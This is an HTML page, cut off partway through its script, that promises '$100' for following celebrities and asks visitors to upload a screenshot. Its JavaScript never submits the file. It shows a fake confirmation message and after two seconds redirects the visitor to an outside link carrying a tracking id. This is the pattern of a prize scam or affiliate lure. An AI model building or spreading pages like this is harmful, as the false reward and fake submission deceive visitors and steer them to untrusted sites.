<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Follow Celebrities and Win $100</title>
    <style>
        /* General styling */
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            color: #333;
            text-align: center;
            padding: 20px;
        }

        /* Logo styling */
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            color: #fff;
            background-color: #00bfff;
            border-radius: 50px;
            width: 80px;
            height: 80px;
            margin: 0 auto;
        }

        /* Header styling */
        .header {
            margin-bottom: 20px;
            font-weight: bold;
            color: #00bfff;
        }

        /* Button and form styling */
        #submissionForm {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            padding: 20px;
            display: inline-block;
            margin-top: 20px;
        }

        #submitButton {
            display: none;
            margin-top: 20px;
            background-color: #ff4500;
            color: #fff;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }

        /* Celebrity list styling */
        #celebrity-list {
            list-style: none;
            padding: 0;
            margin: 20px 0;
            font-size: 18px;
        }

        #celebrity-list li {
            margin: 10px 0;
        }

        /* Link styling */
        a {
            color: #1e90ff;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        /* Confirmation message styling */
        #confirmationMessage {
            display: none;
            color: #32cd32;
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <!-- Logo -->

    <!-- Form -->
    <form id="submissionForm">
        <label for="screenshot">Upload your screenshot:</label><br>
        <input type="file" id="screenshot" name="screenshot" required>
        <button type="submit">Submit</button>
    </form>

    <!-- Confirmation Message -->
    <p id="confirmationMessage">Thank you for your submission! Redirecting...</p>

    <!-- JavaScript -->
    <script>
        document.getElementById("submissionForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent the default form submission
            const fileInput = document.getElementById("screenshot");
            
            if (fileInput.files.length > 0) { // Check if a file is uploaded
                document.getElementById("confirmationMessage").style.display = "block"; // Show confirmation message
                setTimeout(redirectToUrl, 2000); // Redirect after 2 seconds
            } else {
                alert("Please upload a screenshot to proceed.");
            }
        });

        function redirectToUrl() {
            window.location.href = "http://xportbox.com/XU/VI?nox=7277082848"; // Redirect to the specified URL
